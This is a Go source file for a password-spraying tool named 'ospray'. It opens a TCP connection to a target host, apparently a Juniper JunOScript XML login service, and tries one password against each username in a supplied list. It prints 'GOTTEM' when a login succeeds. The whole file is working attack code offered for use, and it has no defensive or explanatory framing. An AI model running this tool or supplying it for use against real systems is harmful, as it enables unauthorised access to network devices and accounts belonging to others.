package main

import (
	"bufio"
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
)

type Flags struct {
	Target   string
	Port     string
	UserList string
	Password string
}

func main() {
	//fmt.Println("Hello!")
	var conn net.Conn
	var err error

	// Get Flags from user:
	userFlags := GetFlags()

	// Once we have flags, try to open file:
	userList, err := GetUsers(userFlags)
	if err != nil {
		fmt.Printf("ERROR reading user list: Please supply ospray with a path to your file of users to spray (use -uL)\n")
		return
	}

	remoteHost := net.JoinHostPort(userFlags.Target, userFlags.Port)

	// Get Connection:
	conn, err = net.Dial("tcp", remoteHost)
	if err != nil {
		fmt.Printf("Error dialing remote host: %v\n", err)
		return
	}
	defer conn.Close()

	// Create parent context:
	parentCtx, pCancel := context.WithCancel(context.Background())
	defer pCancel()

	// SIGINT routine:
	go func() {
		// If SIGINT: close connection, exit
		signalChan := make(chan os.Signal, 1)
		signal.Notify(signalChan, os.Interrupt)
		defer signal.Stop(signalChan)

		<-signalChan
		pCancel()
	}()

	// Child Context/ main connection subroutine:
	err = Start(parentCtx, conn, userList, userFlags.Password)
	if err != nil {
		fmt.Printf("ERROR in Run subroutine: %v\n", err)
		conn.Close()
		os.Exit(1337)
	}
}

func GetFlags() Flags {
	target := flag.String("H", "0.0.0.0", "target host IP address")
	port := flag.String("p", "3221", "target port")
	userList := flag.String("uL", "users.txt", "file containing new-line serparated users to spray")
	password := flag.String("pw", "Password123!", "password to use (string)")

	// Parse
	flag.Parse()

	flags := Flags{Target: *target, Port: *port, UserList: *userList, Password: *password}
	return flags
}

func GetUsers(flags Flags) ([]string, error) {
	// Try to open user-supplied file:
	file, err := os.Open(flags.UserList)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines, scanner.Err()
}

func Start(pctx context.Context, conn net.Conn, userList []string, password string) error {
	var returnErr error
	// Create child context:
	childContext, chCancel := context.WithCancel(pctx)
	defer chCancel()

	// Create waitgroup:
	var wg sync.WaitGroup
	wg.Add(1)

	// Create channel for signaling other Go Routine to stop
	startSprayChan := make(chan bool, 1)
	uL := userList

	// Go Routines:
	go func(uL []string, returnErr error) { // Read from socket routine
		defer wg.Done()
		i := 0
		var messageStart string

		for {
			select {
			case <-childContext.Done():
				returnErr = fmt.Errorf("Child context sent done signal in read socket routine\n")
				return
			case <-startSprayChan:
				// Shift first item in user list:
				shift := uL[i]
				i++

				// Build XML login request
				loginReq := fmt.Sprintf("%v<rpc><request-login><username>%v</username><challenge-response>%v</challenge-response></request-login></rpc>", messageStart, shift, password)

				// Send login request
				reqBytes := []byte(loginReq)
				_, err := conn.Write(reqBytes)
				if err != nil {
					returnErr = fmt.Errorf("ERROR sending spray request to target: %v\n", err)
					return
				}

			default:
				// Read socket
				var messageBytes []byte
				buffer := make([]byte, 1024)
				msgReceivedLength, err := conn.Read(buffer)

				if msgReceivedLength > 0 {
					// Print to stdout:
					messageBytes = buffer[:msgReceivedLength]
					_, err = os.Stdout.Write(messageBytes)
					if err != nil {
						returnErr = fmt.Errorf("Error writing socket message to stdout: %v\n", err)
						return
					}
				}

				if err != nil {
					// Sometimes it's just an EOF ¯\_(ツ)_/¯
					if errors.Is(err, io.EOF) {
						continue
					} else {
						returnErr = fmt.Errorf("ERROR reading from socket: %v\n", err)
						return
					}
				}

				// Check if the session started, and if so, start writing routine:
				messageString := string(messageBytes)

				if strings.Contains(messageString, "session start") {
					messageStart = fmt.Sprintf("<?xml version='1.0' encoding='us-ascii'?><junoscript version='1.0' hostname=''>")
					startSprayChan <- true
				} else if strings.Contains(messageString, "<status>success</status>") {
					fmt.Printf("GOTTEM \n")
					returnErr = nil
					return
				} else if strings.Contains(messageString, "</rpc-reply>") {
					messageStart = ""
					startSprayChan <- true
					continue
				} else if strings.Contains(messageString, "</junoscript>") {
					returnErr = fmt.Errorf("Server ended session w/ </junoscript>\n")
					return
				} else {
					continue
				}
			}
		}
	}(uL, returnErr)

	wg.Wait()
	return returnErr
}
